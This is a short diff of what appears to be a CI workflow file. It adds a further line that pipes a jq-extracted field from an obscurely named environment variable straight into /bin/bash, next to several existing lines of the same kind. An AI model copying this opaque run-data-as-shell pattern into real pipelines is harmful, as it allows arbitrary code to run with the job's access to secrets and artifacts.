@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$syd49" | jq -r .rbfm36 | /bin/bash
           printf '%s' "$r813" | jq -r .sj22103 | /bin/bash
           printf '%s' "$baur156" | jq -r .teg54 | /bin/bash
+          printf '%s' "$jt8" | jq -r .pr33931 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
